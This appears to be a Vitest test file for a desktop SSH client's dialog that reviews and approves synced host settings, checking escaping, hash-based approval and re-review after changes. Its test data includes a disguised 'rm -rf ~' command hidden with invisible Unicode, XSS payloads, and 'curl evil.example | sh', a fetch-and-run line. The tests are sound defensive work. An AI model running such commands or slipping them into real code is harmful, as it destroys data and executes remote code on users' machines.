// @vitest-environment jsdom
/**
 * The review of synced settings that act (ADR 0010): it shows exactly what a
 * connection left out, writes disguised text out, approves the hash the
 * backend gave and nothing else, and copes with the fields changing under it.
 */

import { flushSync, mount, tick, unmount } from 'svelte';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import ExecApprovalDialog from './ExecApprovalDialog.svelte';
import { execApproval } from '../stores/exec-approval.svelte';
import { notices } from '../notify.svelte';
import { noticeText } from '../test-support/notices';
import { click, findButton, newTarget, press, stubBrowserApis } from '../test-support/dom';
import { answers, callsOf, failures, resetTauriMock } from '../test-support/tauri-core-mock';
import { revealed } from '../display-text';
import type { HostExecReview } from '../types';

vi.mock('@tauri-apps/api/core', () => import('../test-support/tauri-core-mock'));

function review(over: Partial<HostExecReview> = {}): HostExecReview {
  return {
    host_id: 'atlas',
    host_name: 'atlas-prod',
    hash: 'hash-1',
    pending: true,
    fields: {
      startup_command: 'tmux new -A -s atlas',
      agent_forward: true,
      env: [
        { name: 'LANG', value: 'en_US.UTF-8' },
        { name: 'TERMRU_PROFILE', value: 'ops' },
      ],
      forwards: [
        {
          kind: 'local',
          bind_address: '0.0.0.0',
          bind_port: 9090,
          target_host: 'metrics.internal',
          target_port: 9090,
          enabled: true,
        },
      ],
    },
    ...over,
  };
}

let target: HTMLElement;
let component: ReturnType<typeof mount> | null = null;

async function show(): Promise<void> {
  component = mount(ExecApprovalDialog, { target });
  flushSync();
  void execApproval.show('atlas');
  await vi.waitFor(() => expect(execApproval.loading).toBe(false));
  flushSync();
  await tick();
}

const text = () => target.textContent?.replace(/\s+/g, ' ').trim() ?? '';

beforeEach(() => {
  resetTauriMock();
  stubBrowserApis();
  notices.reset();
  execApproval.close();
  execApproval.current = null;
  execApproval.error = null;
  answers.set('host_exec_review', review());
  answers.set('host_exec_approve', null);
  target = newTarget();
});

afterEach(() => {
  if (component) unmount(component);
  component = null;
  target.remove();
  document.body.replaceChildren();
});

describe('what is shown', () => {
  it('names the host and lists exactly the fields that were left out', async () => {
    await show();
    expect(target.querySelector('h2')?.textContent).toBe('Approve synced settings');
    expect(text()).toContain('Synced settings for atlas-prod need your approval on this device.');
    const sections = Array.from(target.querySelectorAll('dl .field')).map((field) =>
      field.querySelector('dt')?.textContent?.trim(),
    );
    expect(sections).toEqual([
      'Startup command',
      'Agent forwarding',
      'Environment variables',
      'Forwards that are not loopback only',
    ]);
    expect(target.querySelector('code.block')?.textContent).toBe('tmux new -A -s atlas');
    const codes = Array.from(target.querySelectorAll('dd code')).map((code) => code.textContent);
    expect(codes).toContain('LANG=en_US.UTF-8');
    expect(codes).toContain('TERMRU_PROFILE=ops');
    expect(codes).toContain('L 0.0.0.0:9090 → metrics.internal:9090');
    expect(text()).toContain("The server's administrators can use your agent's keys");
    expect(text()).toContain('Forwards that listen on loopback only still run.');
  });

  it('leaves out what the host does not ask for', async () => {
    answers.set(
      'host_exec_review',
      review({
        fields: { startup_command: 'uptime', agent_forward: false, env: [], forwards: [] },
      }),
    );
    await show();
    const sections = Array.from(target.querySelectorAll('dl dt')).map((dt) => dt.textContent);
    expect(sections).toEqual(['Startup command']);
  });

  it('writes a command that could disguise itself out, character by character', async () => {
    answers.set(
      'host_exec_review',
      review({
        fields: {
          startup_command: 'ls ‮/tcf/ cat​ ; rm -rf ~\u0007',
          agent_forward: false,
          env: [{ name: 'A', value: 'x⁦y' }],
          forwards: [],
        },
      }),
    );
    await show();
    const command = target.querySelector('code.block')?.textContent ?? '';
    expect(command).toBe('ls ‹U+202E›/tcf/ cat‹U+200B› ; rm -rf ~‹U+0007›');
    expect(command).not.toMatch(/[‮​\u0007]/);
    expect(text()).toContain('A=x‹U+2066›y');
    expect(revealed('plain text\ttab')).toBe('plain text\ttab');
  });

  it('shows what it is as plain text, never as markup', async () => {
    answers.set(
      'host_exec_review',
      review({
        host_name: '<img src=x onerror=alert(1)>',
        fields: {
          startup_command: '<script>alert(1)</script>',
          agent_forward: false,
          env: [],
          forwards: [],
        },
      }),
    );
    await show();
    expect(target.querySelector('img')).toBeNull();
    expect(target.querySelector('script')).toBeNull();
    expect(target.querySelector('code.block')?.textContent).toBe('<script>alert(1)</script>');
  });

  it('says why it could not read the settings', async () => {
    failures.set('host_exec_review', 'no host with id atlas');
    component = mount(ExecApprovalDialog, { target });
    void execApproval.show('atlas');
    await vi.waitFor(() => expect(execApproval.open).toBe(true));
    flushSync();
    expect(execApproval.error).toBe('no host with id atlas');
    expect(target.querySelector('[role="alert"]')?.textContent).toContain('no host with id atlas');
    expect(text()).toContain('The settings of the host could not be read.');
    // Nothing to approve: only a way out.
    expect(() => findButton(target, 'Approve on this device')).toThrow();
    click(findButton(target, 'Close'));
    expect(execApproval.open).toBe(false);
  });

  it('does not keep another host’s settings on screen while a new review loads', async () => {
    await show();
    expect(text()).toContain('atlas-prod');
    let release: (value: HostExecReview) => void = () => {};
    answers.set('host_exec_review', () => new Promise((resolve) => (release = resolve)));
    void execApproval.show('relay');
    flushSync();
    expect(execApproval.current).toBeNull();
    expect(text()).not.toContain('tmux new -A -s atlas');
    release(review({ host_id: 'relay', host_name: 'relay-edge' }));
    await vi.waitFor(() => expect(execApproval.current?.host_id).toBe('relay'));
    flushSync();
    expect(text()).toContain('relay-edge');
  });
});

describe('approving', () => {
  it('sends the hash it was given and nothing the page chose', async () => {
    await show();
    click(findButton(target, 'Approve on this device'));
    await vi.waitFor(() => expect(callsOf('host_exec_approve')).toHaveLength(1));
    expect(callsOf('host_exec_approve')[0].args).toEqual({ id: 'atlas', hash: 'hash-1' });
    await vi.waitFor(() => expect(execApproval.open).toBe(false));
    expect(noticeText(notices.visible[0])).toBe(
      'Settings approved. atlas-prod · New connections use them',
    );
  });

  it('is the default action of Enter, and Escape asks nothing', async () => {
    await show();
    const approve = findButton(target, 'Approve on this device');
    expect(approve.getAttribute('type')).toBe('submit');
    await vi.waitFor(() => expect(document.activeElement).toBe(approve));
    press(approve, 'Escape');
    flushSync();
    expect(execApproval.open).toBe(false);
    expect(callsOf('host_exec_approve')).toHaveLength(0);
  });

  it('can be put off with Not now', async () => {
    await show();
    click(findButton(target, 'Not now'));
    expect(execApproval.open).toBe(false);
    expect(callsOf('host_exec_approve')).toHaveLength(0);
  });

  it('reads the fields again when the backend refuses because they changed', async () => {
    await show();
    failures.set(
      'host_exec_approve',
      'The synced settings of this host changed after you opened the review. Review them again.',
    );
    answers.set(
      'host_exec_review',
      review({
        hash: 'hash-2',
        fields: {
          startup_command: 'curl evil.example | sh',
          agent_forward: true,
          env: [],
          forwards: [],
        },
      }),
    );
    click(findButton(target, 'Approve on this device'));
    await vi.waitFor(() => expect(execApproval.current?.hash).toBe('hash-2'));
    await vi.waitFor(() => expect(execApproval.error).toMatch(/changed after you opened/));
    flushSync();
    // Still open, now showing what the settings are, with the reason.
    expect(execApproval.open).toBe(true);
    expect(target.querySelector('code.block')?.textContent).toBe('curl evil.example | sh');
    expect(target.querySelector('[role="alert"]')?.textContent).toContain(
      'changed after you opened',
    );
    expect(notices.visible.some((notice) => notice.key === 'host.exec-approved')).toBe(false);
    // Approving what is shown now sends the new hash.
    failures.delete('host_exec_approve');
    click(findButton(target, 'Approve on this device'));
    await vi.waitFor(() => expect(callsOf('host_exec_approve')).toHaveLength(2));
    expect(callsOf('host_exec_approve')[1].args).toEqual({ id: 'atlas', hash: 'hash-2' });
  });

  it('is not offered again for settings that are approved', async () => {
    answers.set('host_exec_review', review({ pending: false }));
    await show();
    expect(target.querySelector('h2')?.textContent).toBe('Synced settings');
    expect(text()).toContain('The settings of atlas-prod are approved on this device.');
    expect(text()).toContain('Connect again to use them');
    expect(() => findButton(target, 'Approve on this device')).toThrow();
    click(findButton(target, 'Close'));
    expect(execApproval.open).toBe(false);
  });

  it('does not approve twice while one approval is under way', async () => {
    await show();
    let release: () => void = () => {};
    answers.set(
      'host_exec_approve',
      () => new Promise<null>((resolve) => (release = () => resolve(null))),
    );
    const approve = findButton(target, 'Approve on this device');
    click(approve);
    click(approve);
    await vi.waitFor(() => expect(callsOf('host_exec_approve')).toHaveLength(1));
    expect(execApproval.busy).toBe(true);
    release();
    await vi.waitFor(() => expect(execApproval.open).toBe(false));
    expect(callsOf('host_exec_approve')).toHaveLength(1);
  });
});
